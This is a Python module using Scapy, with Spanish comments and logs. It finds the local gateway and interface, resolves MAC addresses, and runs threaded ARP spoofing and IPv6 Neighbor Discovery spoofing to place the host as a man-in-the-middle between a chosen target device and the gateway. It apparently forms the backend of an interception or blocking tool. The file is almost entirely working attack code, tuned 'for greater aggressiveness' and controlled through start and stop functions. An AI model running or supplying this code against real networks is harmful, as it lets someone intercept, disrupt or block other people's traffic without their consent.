# controlador/arp_manager.py
from scapy.all import (
    ARP, Ether, srp, srp1, sendp, conf, getmacbyip, get_if_hwaddr,
    IPv6, ICMPv6ND_NS, ICMPv6ND_NA, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptDstLLAddr,
    read_routes6, Packet # Import Packet para isinstance
)
import socket # Necesario para inet_pton
import time
import threading
import logging
import re # No parece usarse, pero lo dejaremos si estaba.
import traceback # Importamos traceback para el logging detallado de excepciones

# Configurar logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - [%(funcName)s] - %(message)s')

active_attacks = {}

MY_MAC = None
GATEWAY_IPV4 = None
GATEWAY_IPV6_LL = None
DEFAULT_IFACE = None

def mac_to_ipv6_linklocal(mac):
    if not mac or len(mac.split(':')) != 6:
        logging.error(f"MAC inválida para convertir a IPv6 LL: {mac}")
        return None
    parts = mac.split(':')
    first_byte = int(parts[0], 16) ^ 0x02
    eui_64_part = f"{first_byte:02x}{parts[1]}:{parts[2]}ff:fe{parts[3]}:{parts[4]}{parts[5]}"
    return f"fe80::{eui_64_part}"

def initialize_network_info():
    global MY_MAC, GATEWAY_IPV4, GATEWAY_IPV6_LL, DEFAULT_IFACE
    if MY_MAC and DEFAULT_IFACE and GATEWAY_IPV4:
        logging.debug("NET_INIT: Ya inicializado con MAC, IFACE y Gateway IPv4.")
        return True
        
    logging.info("NET_INIT: Iniciando detección de información de red...")
    try:
        route_info_ipv4 = conf.route.route("0.0.0.0")
        if route_info_ipv4 and len(route_info_ipv4) >= 3 and route_info_ipv4[0] and route_info_ipv4[2]:
            DEFAULT_IFACE = route_info_ipv4[0]
            GATEWAY_IPV4 = route_info_ipv4[2]
            MY_MAC = get_if_hwaddr(DEFAULT_IFACE)
            conf.iface = DEFAULT_IFACE
            logging.info(f"NET_INIT: Interfaz={DEFAULT_IFACE}, Mi MAC={MY_MAC}, Gateway IPv4={GATEWAY_IPV4}")
        else:
            logging.error("NET_INIT: No se pudo determinar Gateway IPv4 / Interfaz principal vía conf.route.")
            all_ifaces = [i for i in conf.ifaces.keys() if isinstance(i, str)] 
            common_ifaces = [i for i in all_ifaces if 'lo' not in i and 'docker' not in i and 'veth' not in i and 'vmnet' not in i and 'virbr' not in i]
            if common_ifaces:
                DEFAULT_IFACE = common_ifaces[0] 
                MY_MAC = get_if_hwaddr(DEFAULT_IFACE)
                conf.iface = DEFAULT_IFACE
                logging.warning(f"NET_INIT: Usando interfaz fallback {DEFAULT_IFACE}, MAC {MY_MAC}. Gateway IPv4 no detectado automáticamente.")
            else:
                logging.critical("NET_INIT: No se pudo encontrar ninguna interfaz de red adecuada.")
                return False
        
        try:
            routes = read_routes6()
            found_gw_ipv6 = False
            if routes:
                for r_idx, r_val in enumerate(routes): 
                    if len(r_val) >= 4 and r_val[0] == '::' and r_val[1] == 0 and r_val[3] == DEFAULT_IFACE:
                        gw_ipv6 = r_val[2]
                        if gw_ipv6 and gw_ipv6.startswith("fe80::"):
                            GATEWAY_IPV6_LL = gw_ipv6
                            logging.info(f"NET_INIT: Gateway IPv6 Link-Local (vía tabla de rutas {r_idx}): {GATEWAY_IPV6_LL}")
                            found_gw_ipv6 = True
                            break
            if not found_gw_ipv6:
                logging.warning("NET_INIT: No se encontró Gateway IPv6 LL en tabla de rutas para la interfaz por defecto.")
                if GATEWAY_IPV4: 
                    logging.debug(f"NET_INIT: Intentando derivar Gateway IPv6 LL de la MAC del Gateway IPv4 ({GATEWAY_IPV4})...")
                    # Temporalmente deshabilitar la llamada recursiva para evitar problemas si initialize_network_info
                    # es llamada desde get_mac_for_ipv4 y esta es llamada desde aquí.
                    # gw_mac_ipv4 = get_mac_for_ipv4(GATEWAY_IPV4) # POTENCIAL RECURSIÓN
                    # En su lugar, intentaremos obtener la MAC del gateway de forma más directa si es posible,
                    # o confiar en que ya se obtuvo si se llamó antes.
                    # Para este punto, es mejor asumir que si GATEWAY_IPV4 existe, get_mac_for_ipv4 se llamará externamente.
                    # O, mejor aún, hacemos una versión "ligera" de get_mac_for_ipv4 solo para el gateway
                    # que no llame a initialize_network_info. Por ahora, lo omitimos para evitar complejidad.
                    logging.warning("NET_INIT: La derivación de GW IPv6 LL desde MAC de GW IPv4 requiere una llamada segura a get_mac_for_ipv4 (omitido por ahora en init para evitar bucles).")

                else: 
                    logging.warning("NET_INIT: No se pudo autodetectar el Gateway IPv6 Link-Local (ni por rutas ni por derivación). ND Spoofing podría estar limitado.")
        except Exception as e_ipv6:
            logging.warning(f"NET_INIT: Error obteniendo Gateway IPv6 Link-Local: {e_ipv6}. ND Spoofing podría estar limitado.")
            logging.debug(traceback.format_exc())

        return True

    except Exception as e:
        logging.error(f"NET_INIT: Error fatal obteniendo info de red: {e}")
        logging.error(traceback.format_exc())
        return False

def get_mac_for_ipv4(ip_address):
    global DEFAULT_IFACE
    if not DEFAULT_IFACE:
        logging.warning("GET_MAC_IPv4: Interfaz por defecto (DEFAULT_IFACE) no establecida. Intentando inicializar red...")
        if not initialize_network_info(): 
             logging.error("GET_MAC_IPv4: Falló la inicialización de red. No se puede continuar.")
             return None
        if not DEFAULT_IFACE: 
             logging.error("GET_MAC_IPv4: DEFAULT_IFACE sigue sin establecerse después de la inicialización. Abortando.")
             return None
    logging.info(f"GET_MAC_IPv4: Buscando MAC para {ip_address} en interfaz '{DEFAULT_IFACE}'")
    try:
        logging.debug(f"GET_MAC_IPv4: Intentando con getmacbyip('{ip_address}')...")
        mac = getmacbyip(ip_address) 
        if mac and mac.lower() != "00:00:00:00:00:00" and mac.lower() != "ff:ff:ff:ff:ff:ff":
            logging.info(f"GET_MAC_IPv4: MAC encontrada (getmacbyip) para {ip_address}: {mac.lower()}")
            return mac.lower() 
        logging.debug(f"GET_MAC_IPv4: getmacbyip no encontró MAC válida (resultado: '{mac}').")
    except Exception as e_getmac:
         logging.warning(f"GET_MAC_IPv4: Error (ignorable) con getmacbyip para '{ip_address}': {e_getmac}")
         logging.debug(traceback.format_exc())
    try:
        logging.debug(f"GET_MAC_IPv4: Intentando con srp (ARP request directo) para '{ip_address}' en interfaz '{DEFAULT_IFACE}'...")
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address)
        ans, _ = srp(arp_request, timeout=3, retry=2, verbose=0, iface=DEFAULT_IFACE) 
        if ans:
            found_mac = ans[0][1].hwsrc 
            logging.info(f"GET_MAC_IPv4: MAC encontrada (srp) para {ip_address}: {found_mac.lower()}")
            return found_mac.lower() 
        else:
            logging.warning(f"GET_MAC_IPv4: No se recibió respuesta ARP (srp) para {ip_address}. "
                            f"Verifique: ¿Dispositivo online? ¿Misma red L2? ¿Permisos de root? ¿Firewall?")
            return None
    except PermissionError as e_perm:
         logging.critical(f"GET_MAC_IPv4: ¡¡¡ERROR DE PERMISOS!!! Scapy (srp) necesita ejecutarse como root (con 'sudo') para enviar paquetes ARP. Error: {e_perm}")
         logging.error(traceback.format_exc())
         return None
    except OSError as e_os:
         logging.error(f"GET_MAC_IPv4: Error de Sistema Operativo (¿Interfaz '{DEFAULT_IFACE}' incorrecta o inactiva?): {e_os}")
         logging.error(traceback.format_exc())
         return None
    except Exception as e:
        logging.error(f"GET_MAC_IPv4: Excepción inesperada obteniendo MAC para {ip_address}: {e}")
        logging.error(traceback.format_exc())
        return None
    logging.error(f"GET_MAC_IPv4: Todos los métodos (getmacbyip y srp) fallaron para obtener la MAC de {ip_address}.")
    return None

def get_mac_for_ipv6(ipv6_address_str):
    global MY_MAC, DEFAULT_IFACE
    if not MY_MAC or not DEFAULT_IFACE or not ipv6_address_str:
        logging.error(f"Pre-condiciones no cumplidas para get_mac_for_ipv6. MY_MAC={MY_MAC}, DEFAULT_IFACE={DEFAULT_IFACE}, ipv6_address={ipv6_address_str}")
        return None
    try:
        my_ipv6_ll = mac_to_ipv6_linklocal(MY_MAC)
        if not my_ipv6_ll:
            logging.error(f"No se pudo generar IPv6 Link-Local para mi MAC {MY_MAC} en get_mac_for_ipv6")
            return None
        try:
            addr_bytes = socket.inet_pton(socket.AF_INET6, ipv6_address_str)
        except socket.error as e_sock:
            logging.error(f"Dirección IPv6 inválida para conversión en get_mac_for_ipv6: '{ipv6_address_str}': {e_sock}")
            return None
        last_3_bytes_hex = addr_bytes[-3:].hex()
        solicited_node_mcast_mac = f"33:33:ff:{last_3_bytes_hex[0:2]}:{last_3_bytes_hex[2:4]}:{last_3_bytes_hex[4:6]}"
        solicited_node_ipv6_target = f"ff02::1:ff{last_3_bytes_hex[0:2]}:{last_3_bytes_hex[2:4]}{last_3_bytes_hex[4:6]}"
        logging.info(f"Solicitando MAC para IPv6 {ipv6_address_str} (MiLL: {my_ipv6_ll}, TargetSolNodeIP: {solicited_node_ipv6_target}, TargetSolNodeMAC: {solicited_node_mcast_mac}) en iface {DEFAULT_IFACE}")
        ns_pkt = Ether(dst=solicited_node_mcast_mac, src=MY_MAC) / \
                 IPv6(src=my_ipv6_ll, dst=solicited_node_ipv6_target) / \
                 ICMPv6ND_NS(tgt=ipv6_address_str) / \
                 ICMPv6NDOptSrcLLAddr(lladdr=MY_MAC)
        logging.debug(f"Enviando NS packet: {ns_pkt.summary()}")
        ans_pkt = srp1(ns_pkt, timeout=3, verbose=0, iface=DEFAULT_IFACE, retry=2) 
        if ans_pkt:
            logging.debug(f"Paquete de respuesta IPv6 recibido: {ans_pkt.summary()}")
            if ICMPv6ND_NA in ans_pkt:
                na_layer = ans_pkt[ICMPv6ND_NA]
                logging.debug(f"Es un NA. Target del NA: {na_layer.tgt}")
                if na_layer.tgt.lower() == ipv6_address_str.lower():
                    current_option = na_layer.payload 
                    while isinstance(current_option, Packet) and current_option != b'' and hasattr(current_option, 'type'):
                        if current_option.type == 2 and hasattr(current_option, 'lladdr'):
                            found_mac = current_option.lladdr
                            logging.info(f"MAC encontrada para IPv6 {ipv6_address_str} -> {found_mac.lower()} (Opción: DstLLAddr)")
                            return found_mac.lower()
                        elif current_option.type == 1 and hasattr(current_option, 'lladdr'):
                             logging.debug(f"Opción SrcLLAddr encontrada en NA con MAC: {current_option.lladdr}")
                        if not hasattr(current_option, 'payload'): break
                        current_option = current_option.payload
                    logging.warning(f"NA recibido para IPv6 {ipv6_address_str} pero no se encontró la opción DstLLAddr (type 2) con lladdr en su payload.")
                else:
                    logging.debug(f"NA recibido, pero para un target IPv6 diferente: {na_layer.tgt} (esperado: {ipv6_address_str})")
            else:
                logging.debug(f"Paquete IPv6 recibido no es NA: {ans_pkt.summary()}")
        else:
            logging.warning(f"No se recibió respuesta (timeout) para IPv6 {ipv6_address_str} vía NS. ¿Online? ¿Misma red L2? ¿Permisos?")
    except PermissionError as e_perm_ipv6:
        logging.critical(f"GET_MAC_IPv6: ¡¡¡ERROR DE PERMISOS!!! Scapy (srp1) necesita ejecutarse como root (con 'sudo') para enviar paquetes NS. Error: {e_perm_ipv6}")
        logging.error(traceback.format_exc())
    except OSError as e_os_ipv6:
        logging.error(f"GET_MAC_IPv6: Error de Sistema Operativo (¿Interfaz '{DEFAULT_IFACE}' incorrecta o inactiva?): {e_os_ipv6}")
        logging.error(traceback.format_exc())
    except Exception as e:
        logging.error(f"GET_MAC_IPv6: EXCEPCIÓN para {ipv6_address_str}. Tipo: {type(e)}, Mensaje: {str(e)}")
        logging.error(f"Traceback completo:\n{traceback.format_exc()}")
    return None

def arp_spoof_mitm_thread(target_ipv4, gateway_ipv4, my_mac, stop_event):
    target_mac = get_mac_for_ipv4(target_ipv4)
    gateway_mac = get_mac_for_ipv4(gateway_ipv4)
    if not target_mac or not gateway_mac:
        logging.error(f"ARP_MITM: No MACs para target '{target_ipv4}' (MAC: {target_mac}) o gateway '{gateway_ipv4}' (MAC: {gateway_mac}). Abortando hilo.")
        return
    logging.info(f"ARP_MITM: Iniciando para {target_ipv4} (MAC:{target_mac}) <-> {gateway_ipv4} (MAC:{gateway_mac})")
    pkt_to_target = Ether(dst=target_mac, src=my_mac)/ARP(op=2, pdst=target_ipv4, hwdst=target_mac, psrc=gateway_ipv4, hwsrc=my_mac)
    pkt_to_gateway = Ether(dst=gateway_mac, src=my_mac)/ARP(op=2, pdst=gateway_ipv4, hwdst=gateway_mac, psrc=target_ipv4, hwsrc=my_mac)
    while not stop_event.is_set():
        try:
            sendp(pkt_to_target, verbose=0, iface=DEFAULT_IFACE)
            sendp(pkt_to_gateway, verbose=0, iface=DEFAULT_IFACE)
            time.sleep(0.2) # Ajustado para mayor agresividad
        except Exception as e: 
            logging.error(f"ARP_MITM: Error enviando para {target_ipv4}: {e}")
            logging.debug(traceback.format_exc())
    logging.info(f"ARP_MITM: Hilo para {target_ipv4} detenido. Procediendo a restaurar ARP.")
    restore_arp(target_ipv4, gateway_ipv4, target_mac, gateway_mac)

def nd_spoof_mitm_thread(target_ipv6_ll, gateway_ipv6_ll, my_mac, stop_event):
    if not target_ipv6_ll or not gateway_ipv6_ll or not my_mac:
        logging.error(f"ND_MITM: Faltan parámetros: TGT_LL={target_ipv6_ll}, GW_LL={gateway_ipv6_ll}, MY_MAC={my_mac}")
        return
    target_mac = get_mac_for_ipv6(target_ipv6_ll) 
    gateway_mac = get_mac_for_ipv6(gateway_ipv6_ll) 
    if not target_mac or not gateway_mac:
        logging.error(f"ND_MITM: No se pudieron obtener MACs para target_ipv6='{target_ipv6_ll}' (MAC:{target_mac}) o gateway_ipv6='{gateway_ipv6_ll}' (MAC:{gateway_mac}). Abortando hilo.")
        return
    logging.info(f"ND_MITM: Iniciando para {target_ipv6_ll} (MAC:{target_mac}) <-> {gateway_ipv6_ll} (MAC:{gateway_mac})")
    pkt_to_target = Ether(dst=target_mac, src=my_mac) / \
                    IPv6(src=gateway_ipv6_ll, dst=target_ipv6_ll) / \
                    ICMPv6ND_NA(tgt=gateway_ipv6_ll, R=0, S=1, O=1) / \
                    ICMPv6NDOptDstLLAddr(lladdr=my_mac) 
    pkt_to_gateway = Ether(dst=gateway_mac, src=my_mac) / \
                     IPv6(src=target_ipv6_ll, dst=gateway_ipv6_ll) / \
                     ICMPv6ND_NA(tgt=target_ipv6_ll, R=0, S=1, O=1) / \
                     ICMPv6NDOptDstLLAddr(lladdr=my_mac)
    while not stop_event.is_set():
        try:
            sendp(pkt_to_target, verbose=0, iface=DEFAULT_IFACE)
            sendp(pkt_to_gateway, verbose=0, iface=DEFAULT_IFACE)
            time.sleep(0.2) # Ajustado para mayor agresividad
        except Exception as e: 
            logging.error(f"ND_MITM: Error enviando para {target_ipv6_ll}: {e}")
            logging.debug(traceback.format_exc())
    logging.info(f"ND_MITM: Hilo para {target_ipv6_ll} detenido. Procediendo a restaurar ND.")
    restore_nd(target_ipv6_ll, gateway_ipv6_ll, target_mac, gateway_mac)

def restore_arp(target_ipv4, gateway_ipv4, target_mac, gateway_mac):
    logging.info(f"ARP_MITM: Restaurando ARP para {target_ipv4} y {gateway_ipv4}...")
    pkt1 = Ether(dst=target_mac, src=gateway_mac)/ARP(op=2, pdst=target_ipv4, hwdst=target_mac, psrc=gateway_ipv4, hwsrc=gateway_mac)
    pkt2 = Ether(dst=gateway_mac, src=target_mac)/ARP(op=2, pdst=gateway_ipv4, hwdst=gateway_mac, psrc=target_ipv4, hwsrc=target_mac)
    try:
        sendp([pkt1, pkt2], count=5, inter=0.3, verbose=0, iface=DEFAULT_IFACE)
        logging.info(f"ARP_MITM: Restauración ARP enviada para {target_ipv4}.")
    except Exception as e: 
        logging.error(f"ARP_MITM: Error enviando restauración ARP: {e}")
        logging.debug(traceback.format_exc())

def restore_nd(target_ipv6_ll, gateway_ipv6_ll, target_mac, gateway_mac):
    logging.info(f"ND_MITM: Restaurando ND para {target_ipv6_ll} y {gateway_ipv6_ll}...")
    pkt1 = Ether(dst=target_mac, src=gateway_mac) / \
           IPv6(src=gateway_ipv6_ll, dst=target_ipv6_ll) / \
           ICMPv6ND_NA(tgt=gateway_ipv6_ll, R=0, S=1, O=1) / \
           ICMPv6NDOptDstLLAddr(lladdr=gateway_mac) 
    pkt2 = Ether(dst=gateway_mac, src=target_mac) / \
           IPv6(src=target_ipv6_ll, dst=gateway_ipv6_ll) / \
           ICMPv6ND_NA(tgt=target_ipv6_ll, R=0, S=1, O=1) / \
           ICMPv6NDOptDstLLAddr(lladdr=target_mac) 
    try:
        sendp([pkt1, pkt2], count=5, inter=0.3, verbose=0, iface=DEFAULT_IFACE)
        logging.info(f"ND_MITM: Restauración ND enviada para {target_ipv6_ll}.")
    except Exception as e: 
        logging.error(f"ND_MITM: Error enviando restauración ND: {e}")
        logging.debug(traceback.format_exc())

def start_full_attack(target_ipv4):
    global GATEWAY_IPV4, GATEWAY_IPV6_LL, MY_MAC, DEFAULT_IFACE
    if not (MY_MAC and DEFAULT_IFACE and GATEWAY_IPV4): 
        logging.info("START_ATTACK: Información de red no inicializada o incompleta. Llamando a initialize_network_info().")
        if not initialize_network_info(): 
            logging.error("START_ATTACK: Ataque no puede iniciar: Fallo crítico al inicializar información de red.")
            return False
        if not (MY_MAC and DEFAULT_IFACE and GATEWAY_IPV4):
            logging.error("START_ATTACK: Información de red (MAC, IFACE, GW_IPv4) sigue incompleta tras inicialización. Abortando.")
            return False
    if target_ipv4 in active_attacks:
        logging.warning(f"Ataque ya podría estar activo para {target_ipv4}. Verificando estado de hilos...")
        current_attack = active_attacks[target_ipv4]
        all_threads_alive = True
        if not current_attack.get('threads'):
             all_threads_alive = False
             logging.warning(f"No hay 'threads' registrados para {target_ipv4}, se intentará reiniciar.")
        else:
            if not current_attack['threads']:
                all_threads_alive = False
                logging.warning(f"El diccionario 'threads' para {target_ipv4} está vacío, se intentará reiniciar.")
            else:
                for thread_name, thread_obj in current_attack['threads'].items():
                    if not thread_obj.is_alive():
                        all_threads_alive = False
                        logging.warning(f"El hilo {thread_name} para {target_ipv4} no está vivo. Se intentará reiniciar.")
                        break
        if all_threads_alive and current_attack.get('threads'):
            logging.info(f"Todos los hilos para {target_ipv4} ya están activos y registrados.")
            return True 
    if target_ipv4 in active_attacks: 
        logging.info(f"Limpiando ataque anterior (hilos no saludables) para {target_ipv4} antes de reiniciar.")
        threads_to_stop = list(active_attacks[target_ipv4].get('threads', {}).items())
        active_attacks[target_ipv4]['stop_event'].set()
        for thread_name, thread_obj in threads_to_stop:
            thread_obj.join(timeout=1)
        del active_attacks[target_ipv4]
    logging.info(f"START_ATTACK: Iniciando nuevo ataque completo para {target_ipv4}.")
    target_mac = get_mac_for_ipv4(target_ipv4)
    if not target_mac:
        logging.error(f"START_ATTACK: No se pudo obtener MAC IPv4 para {target_ipv4}. No se puede iniciar ataque completo.")
        return False
    logging.info(f"START_ATTACK: MAC de {target_ipv4} es {target_mac}.")
    stop_event = threading.Event()
    threads = {}
    attack_info = {'stop_event': stop_event, 'threads': threads, 'target_mac': target_mac, 'target_ipv4': target_ipv4} 
    if GATEWAY_IPV4 and MY_MAC:
        logging.info(f"Preparando ataque ARP para {target_ipv4} (Gateway: {GATEWAY_IPV4}, MiMAC: {MY_MAC})")
        arp_thread = threading.Thread(target=arp_spoof_mitm_thread, args=(target_ipv4, GATEWAY_IPV4, MY_MAC, stop_event), name=f"ARP_{target_ipv4}")
        arp_thread.daemon = True 
        arp_thread.start()
        threads['arp'] = arp_thread
    else:
        logging.warning("No se iniciará ARP Spoofing: Falta GATEWAY_IPV4 o MY_MAC.")
    if GATEWAY_IPV6_LL and MY_MAC:
        target_ipv6_ll = mac_to_ipv6_linklocal(target_mac)
        if target_ipv6_ll:
            logging.info(f"Preparando ataque ND para target MAC {target_mac} (IPv6 LL: {target_ipv6_ll}, Gateway IPv6 LL: {GATEWAY_IPV6_LL})")
            nd_thread = threading.Thread(target=nd_spoof_mitm_thread, args=(target_ipv6_ll, GATEWAY_IPV6_LL, MY_MAC, stop_event), name=f"ND_{target_ipv4}")
            nd_thread.daemon = True
            nd_thread.start()
            threads['nd'] = nd_thread
        else:
            logging.warning(f"No se pudo derivar IPv6 LL para MAC de target {target_mac}. ND Spoofing no se iniciará.")
    else:
        logging.warning("No se iniciará ND Spoofing: Falta GATEWAY_IPV6_LL o MY_MAC.")
    if not threads:
        logging.error(f"No se pudo preparar ningún hilo de ataque (ni ARP ni ND) para {target_ipv4}")
        return False
    active_attacks[target_ipv4] = attack_info
    logging.info(f"Hilos de ataque para {target_ipv4} iniciados. Hilos: {list(threads.keys())}")
    return True

def stop_full_attack(target_ipv4):
    if target_ipv4 in active_attacks:
        attack_info = active_attacks[target_ipv4]
        logging.info(f"Deteniendo todos los ataques para {target_ipv4}...")
        attack_info['stop_event'].set()
        threads_to_join = list(attack_info.get('threads', {}).items())
        for thread_name, thread_obj in threads_to_join:
            logging.debug(f"Esperando al hilo {thread_name} para {target_ipv4} (timeout 7s)...")
            thread_obj.join(timeout=7) 
            if thread_obj.is_alive():
                logging.warning(f"El hilo {thread_name} para {target_ipv4} no terminó después del timeout.")
            else:
                logging.info(f"Hilo {thread_name} para {target_ipv4} detenido exitosamente.")
        del active_attacks[target_ipv4]
        logging.info(f"Ataque para {target_ipv4} eliminado del registro activo.")
        return True
    else:
        logging.warning(f"No se encontró ataque activo para {target_ipv4} al intentar detener.")
        return False

if __name__ == '__main__':
    logging.getLogger().setLevel(logging.DEBUG)
    if not initialize_network_info(): # Llamada de inicialización
        logging.critical("Prueba directa: FALLO AL INICIALIZAR INFORMACIÓN DE RED. Abortando prueba.")
        exit(1)
    logging.info(f"Prueba directa: Mi MAC: {MY_MAC}, GW IPv4: {GATEWAY_IPV4}, GW IPv6 LL: {GATEWAY_IPV6_LL}, IFACE: {DEFAULT_IFACE}")
    test_ipv4 = "192.168.0.100" 
    test_ipv6 = "fe80::aabb:ccdd:eeff:1122" 
    logging.info(f"\n--- Probando get_mac_for_ipv4({test_ipv4}) ---")
    mac_ipv4 = get_mac_for_ipv4(test_ipv4)
    if mac_ipv4: logging.info(f"Resultado get_mac_for_ipv4: {mac_ipv4}\n")
    else: logging.error(f"Resultado get_mac_for_ipv4: No se pudo obtener MAC para {test_ipv4}\n")
    if MY_MAC and DEFAULT_IFACE: 
        logging.info(f"\n--- Probando get_mac_for_ipv6({test_ipv6}) ---")
        mac_ipv6 = get_mac_for_ipv6(test_ipv6)
        if mac_ipv6: logging.info(f"Resultado get_mac_for_ipv6: {mac_ipv6}\n")
        else: logging.error(f"Resultado get_mac_for_ipv6: No se pudo obtener MAC para {test_ipv6}\n")
    else: logging.warning("Prueba directa: No se probará get_mac_for_ipv6 porque falta MY_MAC o DEFAULT_IFACE.")


# <<< CAMBIO IMPORTANTE: Llamar a initialize_network_info() cuando el módulo se carga >>>
if not initialize_network_info():
    logging.critical("ARP_MANAGER_LOAD: FALLO CRÍTICO AL INICIALIZAR INFORMACIÓN DE RED AL CARGAR EL MÓDULO.")
else:
    logging.info(f"ARP_MANAGER_LOAD: Información de red inicializada al cargar: IFACE={DEFAULT_IFACE}, MY_MAC={MY_MAC}, GW_IPv4={GATEWAY_IPV4}, GW_IPv6_LL={GATEWAY_IPV6_LL}")